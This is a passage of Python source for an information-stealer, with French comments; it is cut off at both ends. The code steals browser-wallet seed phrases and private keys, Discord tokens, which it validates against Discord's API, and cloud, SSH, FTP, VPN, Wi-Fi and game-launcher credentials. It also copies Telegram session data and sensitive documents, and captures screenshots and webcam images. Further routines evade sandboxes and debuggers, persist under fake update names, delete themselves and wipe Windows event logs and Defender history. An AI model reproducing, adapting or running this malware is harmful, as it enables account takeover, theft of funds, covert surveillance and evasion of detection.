    "Trust Wallet":    ("egjidjbpglichdcondbcbdnbeeppgdph", "trust"),
    "Coinbase Wallet": ("hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase"),
    "Binance Wallet":  ("fhbohimaelbohpjbbldcngcnapndodjp", "binance"),
}

SEED_REGEX = re.compile(
    r"(?:vault|seed|mnemonic|phrase)[^\w]{0,10}([a-z]{3,10}(?:\s+[a-z]{3,10}){11,23})",
    re.IGNORECASE)
PRIVKEY_REGEX = re.compile(r"(?:privateKey|private_key)[^\w]{0,5}(0x[0-9a-fA-F]{64}|[0-9a-fA-F]{64})")


def _parse_wallet_leveldb(src):
    findings = {"seeds": set(), "privkeys": set()}
    if not os.path.isdir(src):
        return findings
    for fn in os.listdir(src):
        if not fn.endswith((".ldb", ".log")):
            continue
        full = os.path.join(src, fn)
        try:
            with open(full, "rb") as f:
                data = f.read()
        except Exception:
            continue
        text = data.decode("latin-1", errors="ignore")
        for m in SEED_REGEX.findall(text):
            cleaned = " ".join(m.lower().split())
            if len(cleaned.split()) >= 12:
                findings["seeds"].add(cleaned)
        for m in PRIVKEY_REGEX.findall(text):
            findings["privkeys"].add(m)
    return findings


def collect_browser_wallets(_):
    root = os.path.join(TEMP_DIR, "browser_wallets")
    os.makedirs(root, exist_ok=True)
    found = False
    lines = []

    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                for wallet, (ext_id, short) in BROWSER_WALLET_TARGETS.items():
                    src = os.path.join(prof, "Local Extension Settings", ext_id)
                    if not os.path.isdir(src):
                        continue
                    dst = os.path.join(root, f"{browser}_{wallet}")
                    _copy_tree(src, dst)
                    findings = _parse_wallet_leveldb(src)
                    if findings["seeds"] or findings["privkeys"]:
                        lines.append(f"===== {browser} / {wallet} =====")
                        for s in findings["seeds"]:
                            lines.append(f"  SEED : {s}")
                        for k in findings["privkeys"]:
                            lines.append(f"  KEY  : {k}")
                        lines.append("")
                    found = True

    if lines:
        with open(os.path.join(TEMP_DIR, "browser_wallets_seeds.txt"),
                  "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_discord_tokens(_):
    if OS_TYPE != "Windows":
        return None
    candidates = [
        os.path.join(APPDATA, "Discord", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "DiscordCanary", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "DiscordPTB", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "discord", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb"),
        os.path.join(APPDATA, "Lightcord", "Local Storage", "leveldb"),
    ]
    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                p = os.path.join(prof, "Local Storage", "leveldb")
                if os.path.isdir(p):
                    candidates.append(p)

    regex = re.compile(r"mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}")
    tokens = set()
    for path in candidates:
        tokens |= _leveldb_scan(path, regex)

    if not tokens:
        return None
    out = os.path.join(TEMP_DIR, "discord_tokens.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("\n".join(sorted(tokens)))
    return out


def collect_discord_metadata(_):
    if not requests:
        return None
    token_file = os.path.join(TEMP_DIR, "discord_tokens.txt")
    if not os.path.exists(token_file):
        collect_discord_tokens(TEMP_DIR)
    if not os.path.exists(token_file):
        return None

    with open(token_file, "r", encoding="utf-8") as f:
        tokens = [ln.strip() for ln in f if ln.strip()]
    if not tokens:
        return None

    out = os.path.join(TEMP_DIR, "discord_metadata.txt")
    lines = []
    for tok in tokens[:30]:
        try:
            headers = {"Authorization": tok, "User-Agent": "Mozilla/5.0"}
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=headers, timeout=10)
            if r.status_code != 200:
                lines.append(f"Token: {tok}\n  HTTP {r.status_code}\n\n")
                continue
            u = r.json()
            nitro = {0: "none", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(
                u.get("premium_type"), "?")
            lines.append(
                f"Token: {tok}\n"
                f"  ID: {u.get('id')}\n"
                f"  Username: {u.get('username')}#{u.get('discriminator','')}\n"
                f"  Global name: {u.get('global_name')}\n"
                f"  Email: {u.get('email')}\n"
                f"  Phone: {u.get('phone')}\n"
                f"  Verified: {u.get('verified')}\n"
                f"  MFA: {u.get('mfa_enabled')}\n"
                f"  Nitro: {nitro}\n")
            try:
                gr = requests.get("https://discord.com/api/v9/users/@me/guilds",
                                  headers=headers, timeout=10)
                if gr.status_code == 200:
                    guilds = gr.json()
                    lines.append(f"  🏰 Guilds: {len(guilds)}\n")
                    for g in guilds[:10]:
                        lines.append(f"     - {g.get('name')} ({g.get('id')})\n")
            except Exception:
                pass
            try:
                fr = requests.get("https://discord.com/api/v9/users/@me/relationships",
                                  headers=headers, timeout=10)
                if fr.status_code == 200:
                    lines.append(f"  👥 Friends: {len(fr.json())}\n")
            except Exception:
                pass
            lines.append("\n")
        except Exception as e:
            lines.append(f"Token: {tok}\n  error: {e}\n\n")

    if not lines:
        return None
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(lines))
    return out


def collect_screenshot(_):
    if not ImageGrab:
        return None
    try:
        img = ImageGrab.grab(all_screens=True)
        img.thumbnail((1600, 900))
        out = os.path.join(TEMP_DIR, "screenshot.jpg")
        img.convert("RGB").save(out, "JPEG", quality=60, optimize=True)
        return out
    except Exception as e:
        _log("Screenshot", str(e))
        return None


def collect_webcam(_):
    try:
        import cv2  # type: ignore
    except ImportError:
        return None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None
        time.sleep(0.4)
        ok, frame = cap.read()
        cap.release()
        if not ok:
            return None
        h, w = frame.shape[:2]
        if w > 1280:
            scale = 1280 / w
            frame = cv2.resize(frame, (int(w * scale), int(h * scale)))
        out = os.path.join(TEMP_DIR, "webcam.jpg")
        cv2.imwrite(out, frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
        return out
    except Exception as e:
        _log("Webcam", str(e))
        return None


def collect_apps(_):
    if OS_TYPE != "Windows" or not winreg:
        return None
    rows = []
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    for hive, path in keys:
        try:
            k = winreg.OpenKey(hive, path)
        except OSError:
            continue
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(k, i)
            except OSError:
                break
            i += 1
            try:
                sk = winreg.OpenKey(k, sub)
                try:
                    name = winreg.QueryValueEx(sk, "DisplayName")[0]
                except FileNotFoundError:
                    continue
                try:
                    ver = winreg.QueryValueEx(sk, "DisplayVersion")[0]
                except FileNotFoundError:
                    ver = "?"
                rows.append(f"{name}  v{ver}\n")
            except Exception:
                pass
    if not rows:
        return None
    out = os.path.join(TEMP_DIR, "installed_apps.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(sorted(set(rows))))
    return out


def collect_steam_extended(_):
    if OS_TYPE != "Windows":
        return None
    pf86 = os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)")
    src = os.path.join(pf86, "Steam")
    if not os.path.isdir(src):
        return None
    root = os.path.join(TEMP_DIR, "steam_extended")
    os.makedirs(root, exist_ok=True)
    found = False
    for item in ("loginusers.vdf", "config.vdf", "libraryfolders.vdf"):
        fp = os.path.join(src, "config", item)
        if os.path.exists(fp) and os.path.getsize(fp) < 2_000_000:
            try:
                shutil.copy2(fp, os.path.join(root, item))
                found = True
            except Exception:
                pass
    for fp in glob.glob(os.path.join(src, "ssfn*")):
        try:
            if os.path.getsize(fp) < 200_000:
                shutil.copy2(fp, os.path.join(root, os.path.basename(fp)))
                found = True
        except Exception:
            pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_game_launchers(_):
    if OS_TYPE != "Windows":
        return None
    root = os.path.join(TEMP_DIR, "game_launchers")
    os.makedirs(root, exist_ok=True)
    found = False
    files = {
        "Epic_GameUserSettings.ini": os.path.join(
            LOCAL_APPDATA, "EpicGamesLauncher", "Saved", "Config", "Windows",
            "GameUserSettings.ini"),
        "Epic_LauncherInstalled.dat": os.path.join(
            PROGRAMDATA, "Epic", "UnrealEngineLauncher", "LauncherInstalled.dat"),
        "Riot_RiotClientInstalls.json": os.path.join(
            APPDATA, "Riot Games", "RiotClientInstalls.json"),
        "Riot_UserPrefs.json": os.path.join(
            APPDATA, "Riot Games", "UserPrefs.json"),
        "Bnet_Battle.net.config": os.path.join(
            APPDATA, "Battle.net", "Battle.net.config"),
        "Minecraft_launcher_profiles.json": os.path.join(
            APPDATA, ".minecraft", "launcher_profiles.json"),
        "Minecraft_launcher_accounts.json": os.path.join(
            APPDATA, ".minecraft", "launcher_accounts.json"),
        "Minecraft_launcher_accounts_microsoft_store.json": os.path.join(
            APPDATA, ".minecraft", "launcher_accounts_microsoft_store.json"),
        "Rockstar_settings.xml": os.path.join(
            USERPROFILE, "Documents", "Rockstar Games", "Social Club", "settings.xml"),
        "Ubisoft_Connect_settings.yaml": os.path.join(
            LOCAL_APPDATA, "Ubisoft Game Launcher", "settings.yaml"),
        "GOG_galaxy.json": os.path.join(
            PROGRAMDATA, "GOG.com", "Galaxy", "config.json"),
    }
    for name, src in files.items():
        if os.path.exists(src) and _safe_size(src) < 1_000_000:
            try:
                shutil.copy2(src, os.path.join(root, name))
                found = True
            except Exception:
                pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_vpn(_):
    if OS_TYPE != "Windows":
        return None
    root = os.path.join(TEMP_DIR, "vpn")
    os.makedirs(root, exist_ok=True)
    found = False
    files = {
        "NordVPN_settings": os.path.join(LOCAL_APPDATA, "NordVPN", "NordVPN.exe"),
        "ProtonVPN_user_settings": os.path.join(LOCAL_APPDATA, "ProtonVPN",
                                                "user-settings.json"),
        "Mullvad_settings": os.path.join(APPDATA, "Mullvad VPN", "settings.json"),
        "Surfshark_settings": os.path.join(LOCAL_APPDATA, "Surfshark", "settings.json"),
    }
    for name, src in files.items():
        if src and os.path.exists(src) and _safe_size(src) < 500_000:
            try:
                shutil.copy2(src, os.path.join(root, name))
                found = True
            except Exception:
                pass
    for base in (os.path.join(USERPROFILE, "Documents"),
                 os.path.join(USERPROFILE, "Downloads"),
                 os.path.join(USERPROFILE, "Desktop")):
        if not os.path.isdir(base):
            continue
        for fp in glob.glob(os.path.join(base, "**", "*.ovpn"), recursive=True)[:20]:
            try:
                if os.path.getsize(fp) < 200_000:
                    shutil.copy2(fp, os.path.join(root, os.path.basename(fp)))
                    found = True
            except Exception:
                pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_ftp(_):
    if OS_TYPE != "Windows":
        return None
    root = os.path.join(TEMP_DIR, "ftp")
    os.makedirs(root, exist_ok=True)
    found = False
    fz = os.path.join(APPDATA, "FileZilla")
    if os.path.isdir(fz):
        for fn in ("recentservers.xml", "sitemanager.xml", "filezilla.xml"):
            src = os.path.join(fz, fn)
            if os.path.exists(src):
                shutil.copy2(src, os.path.join(root, fn))
                found = True
    if winreg:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Martin Prikryl\WinSCP 2\Sessions")
            i = 0
            lines = []
            while True:
                try:
                    sname = winreg.EnumKey(k, i)
                except OSError:
                    break
                i += 1
                try:
                    sk = winreg.OpenKey(k, sname)
                    entry = [f"[{sname}]"]
                    for val in ("HostName", "UserName", "Password",
                                "PortNumber", "FSProtocol"):
                        try:
                            entry.append(f"{val}={winreg.QueryValueEx(sk, val)[0]}")
                        except FileNotFoundError:
                            pass
                    lines.append("\n".join(entry) + "\n\n")
                except Exception:
                    pass
            if lines:
                with open(os.path.join(root, "winscp_sessions.txt"),
                          "w", encoding="utf-8") as f:
                    f.write("".join(lines))
                found = True
        except Exception:
            pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_ssh(_):
    root = os.path.join(TEMP_DIR, "ssh")
    os.makedirs(root, exist_ok=True)
    found = False
    ssh_dir = os.path.join(USERPROFILE, ".ssh")
    if os.path.isdir(ssh_dir):
        if _copy_tree(ssh_dir, os.path.join(root, "dot_ssh")):
            found = True
    if winreg and OS_TYPE == "Windows":
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\SimonTatham\PuTTY\Sessions")
            i = 0
            lines = []
            while True:
                try:
                    sname = winreg.EnumKey(k, i)
                except OSError:
                    break
                i += 1
                try:
                    sk = winreg.OpenKey(k, sname)
                    entry = [f"[{sname}]"]
                    for val in ("HostName", "UserName", "PortNumber",
                                "PublicKeyFile", "ProxyHost"):
                        try:
                            entry.append(f"{val}={winreg.QueryValueEx(sk, val)[0]}")
                        except FileNotFoundError:
                            pass
                    lines.append("\n".join(entry) + "\n\n")
                except Exception:
                    pass
            if lines:
                with open(os.path.join(root, "putty_sessions.txt"),
                          "w", encoding="utf-8") as f:
                    f.write("".join(lines))
                found = True
        except Exception:
            pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_cloud(_):
    root = os.path.join(TEMP_DIR, "cloud")
    os.makedirs(root, exist_ok=True)
    found = False
    targets = {
        "aws_credentials": os.path.join(USERPROFILE, ".aws", "credentials"),
        "aws_config":      os.path.join(USERPROFILE, ".aws", "config"),
        "azure_profile":   os.path.join(USERPROFILE, ".azure", "azureProfile.json"),
        "azure_tokens":    os.path.join(USERPROFILE, ".azure", "accessTokens.json"),
        "gcloud_creds":    os.path.join(APPDATA, "gcloud", "credentials.db"),
        "git_credentials": os.path.join(USERPROFILE, ".git-credentials"),
        "git_config":      os.path.join(USERPROFILE, ".gitconfig"),
        "npmrc":           os.path.join(USERPROFILE, ".npmrc"),
        "pypirc":          os.path.join(USERPROFILE, ".pypirc"),
        "docker_config":   os.path.join(USERPROFILE, ".docker", "config.json"),
        "kube_config":     os.path.join(USERPROFILE, ".kube", "config"),
        "gh_hosts":        os.path.join(USERPROFILE, ".config", "gh", "hosts.yml"),
    }
    for name, src in targets.items():
        if os.path.exists(src) and _safe_size(src) < 500_000:
            try:
                shutil.copy2(src, os.path.join(root, name))
                found = True
            except Exception:
                pass
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_telegram(_):
    if OS_TYPE != "Windows":
        return None
    src = os.path.join(APPDATA, "Telegram Desktop", "tdata")
    if not os.path.isdir(src):
        return None

    root = os.path.join(TEMP_DIR, "telegram")
    os.makedirs(root, exist_ok=True)

    priority_patterns = [
        re.compile(r"^key_datas$", re.IGNORECASE),
        re.compile(r"^D877F783D5D3EF8C", re.IGNORECASE),
        re.compile(r"^map\d*", re.IGNORECASE),
        re.compile(r"^settingss?$", re.IGNORECASE),
        re.compile(r"^configs?$", re.IGNORECASE),
        re.compile(r"^user_data", re.IGNORECASE),
        re.compile(r"^prefix", re.IGNORECASE),
    ]

    priority_files = []
    secondary_files = []

    for root_, _, files_ in os.walk(src):
        for fn in files_:
            full = os.path.join(root_, fn)
            try:
                sz = os.path.getsize(full)
            except Exception:
                continue
            rel = os.path.relpath(full, src)
            priority = any(p.match(fn) for p in priority_patterns)
            (priority_files if priority else secondary_files).append((full, rel, sz))

    found = False
    total = 0
    HARD_CAP = 15 * 1024 * 1024

    for full, rel, sz in priority_files:
        if total + sz > HARD_CAP:
            continue
        try:
            dst = os.path.join(root, rel)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(full, dst)
            total += sz
            found = True
        except Exception:
            pass

    for full, rel, sz in secondary_files:
        if total + sz > HARD_CAP:
            continue
        if sz > 2_000_000:
            continue
        try:
            dst = os.path.join(root, rel)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(full, dst)
            total += sz
            found = True
        except Exception:
            pass

    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_signal(_):
    if OS_TYPE != "Windows":
        return None
    root = os.path.join(TEMP_DIR, "signal")
    os.makedirs(root, exist_ok=True)
    found = False
    src = os.path.join(APPDATA, "Signal")
    if os.path.isdir(src):
        for item in ("config.json",):
            s = os.path.join(src, item)
            if os.path.exists(s) and _safe_size(s) < 500_000:
                if _copy_tree(s, os.path.join(root, item)):
                    found = True
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_environment(_):
    out = os.path.join(TEMP_DIR, "environment.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("=== ENVIRONMENT VARIABLES ===\n")
        for k, v in sorted(os.environ.items()):
            f.write(f"{k}={v}\n")
        f.write("\n=== PATH ENTRIES ===\n")
        for p in os.environ.get("PATH", "").split(os.pathsep):
            f.write(p + "\n")
        if OS_TYPE == "Windows" and winreg:
            f.write("\n=== USER ENVIRONMENT (registry) ===\n")
            try:
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment")
                i = 0
                while True:
                    try:
                        name, val, _ = winreg.EnumValue(k, i)
                        f.write(f"{name}={val}\n")
                        i += 1
                    except OSError:
                        break
            except Exception:
                pass
    return out


def collect_product_key(_):
    if OS_TYPE != "Windows" or not winreg:
        return None
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        key_bin = bytearray(winreg.QueryValueEx(k, "DigitalProductId")[0])
    except Exception:
        return None

    chars = "BCDFGHJKMPQRTVWXY2346789"
    key = ""
    offset = 52
    for i in range(25):
        cur = 0
        for j in range(14, -1, -1):
            cur = (cur << 8) ^ key_bin[offset + j]
            key_bin[offset + j] = cur // 24
            cur = cur % 24
        key = chars[cur] + key
        if (i + 1) % 5 == 0 and i != 24:
            key = "-" + key
    out = os.path.join(TEMP_DIR, "product_key.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write(f"Product Key: {key}\n")
    return out


def collect_wifi_passwords(_):
    if OS_TYPE != "Windows":
        return None
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            shell=False, stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW).decode("utf-8", errors="ignore")
    except Exception as e:
        _log("WiFi", str(e))
        return None

    profiles = re.findall(r"All User Profile\s*:\s*(.+)", out)
    lines = []
    for p in profiles:
        p = p.strip()
        try:
            detail = subprocess.check_output(
                ["netsh", "wlan", "show", "profile", f"name={p}", "key=clear"],
                shell=False, stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW).decode("utf-8", errors="ignore")
            m = re.search(r"Key Content\s*:\s*(.+)", detail)
            if m:
                lines.append(f"SSID: {p}\nPass: {m.group(1).strip()}\n\n")
        except Exception:
            pass
    if not lines:
        return None
    out = os.path.join(TEMP_DIR, "wifi.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(lines))
    return out


def collect_files(_):
    root = os.path.join(TEMP_DIR, "files")
    os.makedirs(root, exist_ok=True)
    exts = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
            ".sql", ".db", ".kdbx", ".key", ".pem", ".ovpn", ".rdp", ".wallet"}
    keywords = {"password", "wallet", "secret", "backup", "key", "login",
                "seed", "mnemonic", "2fa", "recovery"}
    scans = [os.path.join(USERPROFILE, d) for d in ("Desktop", "Documents", "Downloads")]
    count, total = 0, 0
    MAX_FILES, MAX_SIZE, MAX_DEPTH, MAX_FILE = 100, 3 * 1024 * 1024, 5, 500 * 1024
    for base in scans:
        if not os.path.exists(base):
            continue
        base_depth = base.rstrip(os.sep).count(os.sep)
        for dirpath, dirs, files in os.walk(base):
            depth = dirpath.count(os.sep) - base_depth
            if depth > MAX_DEPTH:
                dirs[:] = []
                continue
            if count >= MAX_FILES or total >= MAX_SIZE:
                break
            for fn in files:
                if count >= MAX_FILES or total >= MAX_SIZE:
                    break
                fp = os.path.join(dirpath, fn)
                ext = os.path.splitext(fn)[1].lower()
                if ext not in exts and not any(k in fn.lower() for k in keywords):
                    continue
                try:
                    sz = os.path.getsize(fp)
                    if sz > MAX_FILE or total + sz > MAX_SIZE:
                        continue
                    shutil.copy2(fp, os.path.join(root, f"{count:03d}_{fn}"))
                    count += 1
                    total += sz
                except Exception:
                    pass
    if count == 0:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


def collect_wallets(_):
    if OS_TYPE != "Windows":
        return None
    root = os.path.join(TEMP_DIR, "wallets")
    os.makedirs(root, exist_ok=True)
    paths = {
        "Exodus":      os.path.join(APPDATA, "Exodus", "exodus.wallet"),
        "Atomic":      os.path.join(APPDATA, "atomic", "Local Storage", "leveldb"),
        "Electrum":    os.path.join(APPDATA, "Electrum", "wallets"),
        "ElectrumLTC": os.path.join(APPDATA, "Electrum-LTC", "wallets"),
        "Zcash":       os.path.join(APPDATA, "Zcash"),
        "Armory":      os.path.join(APPDATA, "Armory"),
        "Litecoin":    os.path.join(APPDATA, "Litecoin"),
        "Dash":        os.path.join(APPDATA, "Dash"),
        "Dogecoin":    os.path.join(APPDATA, "Dogecoin"),
        "Ethereum":    os.path.join(APPDATA, "Ethereum", "keystore"),
        "Binance":     os.path.join(APPDATA, "Binance"),
        "Coinbase":    os.path.join(APPDATA, "Coinbase"),
        "Coinomi":     os.path.join(APPDATA, "Coinomi"),
        "Jaxx":        os.path.join(APPDATA, "Jaxx"),
        "Bitcoin":     os.path.join(APPDATA, "Bitcoin", "wallets"),
        "Monero":      os.path.join(APPDATA, "Monero", "wallets"),
        "Guarda":      os.path.join(APPDATA, "Guarda"),
        "LedgerLive":  os.path.join(APPDATA, "Ledger Live"),
        "TrezorSuite": os.path.join(APPDATA, "Trezor Suite"),
        "TronLink":    os.path.join(APPDATA, "TronLink"),
    }
    found = False
    total = 0
    for name, src in paths.items():
        if not os.path.exists(src):
            continue
        sz = _safe_size(src)
        if sz > 1_000_000 or total > 5_000_000:
            continue
        if _copy_tree(src, os.path.join(root, name)):
            found = True
            total += sz
    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


# ============================================================
# SÉCURITÉ — anti-VM avec checks timing
# ============================================================
def _rdtsc():
    """Lecture du Time Stamp Counter — détecte les VM qui ont un delta anormal."""
    try:
        return ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(
            ctypes.c_ulonglong())) or ctypes.c_ulonglong().value
    except Exception:
        return 0


def _timing_check():
    """Trois mesures du même code : si delta trop régulier → sandbox."""
    import time as _t
    deltas = []
    for _ in range(3):
        t0 = _t.perf_counter()
        _ = sum(range(10000))
        t1 = _t.perf_counter()
        deltas.append(t1 - t0)
    if len(set(round(d, 8) for d in deltas)) == 1:
        return True  # timing parfaitement régulier → sandbox
    return False


def anti_vm_debug():
    if OS_TYPE != "Windows":
        return False
    procs = {"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
             "vboxservice.exe", "vboxtray.exe", "xenservice.exe",
             "joeboxcontrol.exe", "sandboxiedcomlaunch.exe",
             "idaq.exe", "idaq64.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe",
             "procmon.exe", "procmon64.exe", "wireshark.exe", "fiddler.exe",
             "frida-server.exe"}
    if psutil:
        try:
            for p in psutil.process_iter(["name"]):
                nm = (p.info.get("name") or "").lower()
                if nm in procs:
                    return True
        except Exception:
            pass
    if winreg:
        checks = [
            (r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier"),
            (r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName"),
            (r"HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer"),
        ]
        for path, name in checks:
            try:
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                v = str(winreg.QueryValueEx(k, name)[0])
                if any(s in v for s in ("VMware", "VirtualBox", "VBOX", "QEMU", "Xen", "KVM")):
                    return True
            except Exception:
                pass
    if psutil:
        try:
            for _, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.family == psutil.AF_LINK:
                        mac = a.address.replace(":", "").lower()
                        if mac.startswith(("000c29", "005056", "000569",
                                           "080027", "001c14", "0003ff",
                                           "00155d", "0a0027")):
                            return True
        except Exception:
            pass
    # Check hardware (RAM anormale)
    if psutil:
        try:
            total_ram_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_ram_gb < 2 or total_ram_gb > 512:
                return True
            cpus = psutil.cpu_count(logical=False)
            if cpus and cpus < 2:
                return True
        except Exception:
            pass
    # Check timing
    try:
        if _timing_check():
            return True
    except Exception:
        pass
    return False


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def persist_startup():
    if OS_TYPE != "Windows":
        return
    target = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    # Méthode 1 : registre HKCU\Run
    if winreg:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            entry = f"WinUpdate_{''.join(random.choices('0123456789abcdef', k=4))}"
            winreg.SetValueEx(k, entry, 0, winreg.REG_SZ, target)
            winreg.CloseKey(k)
        except Exception:
            pass
    # Méthode 2 : schtasks (plus discret qu'une entrée Run simple)
    try:
        task_name = f"MSUpdate_{random.randint(1000, 9999)}"
        subprocess.run(
            ["schtasks", "/create", "/tn", task_name,
             "/tr", target, "/sc", "onlogon", "/f"],
            shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=15
        )
    except Exception:
        pass


def self_delete():
    if OS_TYPE != "Windows":
        return
    try:
        target = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        bat = os.path.join(tempfile.gettempdir(),
                           f"cln_{''.join(random.choices('0123456789abcdef', k=8))}.bat")
        with open(bat, "w") as f:
            f.write(f"@echo off\r\ntimeout /t 5 /nobreak > NUL\r\n"
                    f"del /f /q \"{target}\"\r\ndel /f /q \"%~f0\"\r\n")
        subprocess.Popen(bat, creationflags=subprocess.DETACHED_PROCESS |
                         subprocess.CREATE_NEW_PROCESS_GROUP, shell=True)
    except Exception as e:
        _log("SelfDelete", str(e))


def wipe_logs():
    if OS_TYPE != "Windows":
        return
    for c in (["wevtutil", "cl", "System"], ["wevtutil", "cl", "Security"],
              ["wevtutil", "cl", "Application"], ["wevtutil", "cl", "Setup"]):
        try:
            subprocess.run(c, shell=False, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
    defender = os.path.join(PROGRAMDATA, "Microsoft", "Windows Defender", "Scans", "History")
    if os.path.isdir(defender):
        shutil.rmtree(defender, ignore_errors=True)
    try:
        subprocess.run(["reagentc", "/disable"], shell=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass


# ============================================================
# MODULES REGISTRY
# ============================================================
MODULES = [
    (MODULE_FLAG_SYSTEM_INFO,       "System Info",       collect_system_info,       "01_System",       "system"),
    (MODULE_FLAG_ENVIRONMENT,       "Environment",       collect_environment,       "01_System",       "system"),
    (MODULE_FLAG_APPS,              "Installed Apps",    collect_apps,              "01_System",       "system"),
    (MODULE_FLAG_PRODUCT_KEY,       "Product Key",       collect_product_key,       "01_System",       "system"),
    (MODULE_FLAG_PASSWORDS,         "Passwords",         collect_passwords,         "02_Credentials",  "credentials"),
    (MODULE_FLAG_COOKIES,           "Cookies",           collect_cookies,           "02_Credentials",  "credentials"),
    (MODULE_FLAG_CREDIT_CARDS,      "Credit Cards",      collect_credit_cards,      "02_Credentials",  "credentials"),
    (MODULE_FLAG_AUTOFILL,          "Autofill",          collect_autofill,          "02_Credentials",  "credentials"),
    (MODULE_FLAG_EXTENSIONS,        "Extensions",        collect_extensions,        "02_Credentials",  "credentials"),
    (MODULE_FLAG_FIREFOX,           "Firefox",           collect_firefox,           "02_Credentials",  "credentials"),
    (MODULE_FLAG_DISCORD_TOKENS,    "Discord Tokens",    collect_discord_tokens,    "03_Discord",      "discord"),
    (MODULE_FLAG_DISCORD_METADATA,  "Discord Metadata",  collect_discord_metadata,  "03_Discord",      "discord"),
    (MODULE_FLAG_ROBLOX_COOKIES,    "Roblox Cookies",    collect_roblox_cookies,    "04_Roblox",       "roblox"),
    (MODULE_FLAG_WALLETS,           "Wallets",           collect_wallets,           "05_Wallets",      "wallets"),
    (MODULE_FLAG_BROWSER_WALLETS,   "Browser Wallets",   collect_browser_wallets,   "05_Wallets",      "wallets"),
    (MODULE_FLAG_SCREENSHOT,        "Screenshot",        collect_screenshot,        "06_Media",        "media"),
    (MODULE_FLAG_WEBCAM,            "Webcam",            collect_webcam,            "06_Media",        "media"),
    (MODULE_FLAG_GAME_LAUNCHERS,    "Game Launchers",    collect_game_launchers,    "07_Gaming",       "gaming"),
    (MODULE_FLAG_STEAM_EXTENDED,    "Steam Extended",    collect_steam_extended,    "07_Gaming",       "gaming"),
    (MODULE_FLAG_WIFI_PASSWORDS,    "WiFi Passwords",    collect_wifi_passwords,    "08_Network",      "network"),
    (MODULE_FLAG_VPN,               "VPN",               collect_vpn,               "08_Network",      "network"),
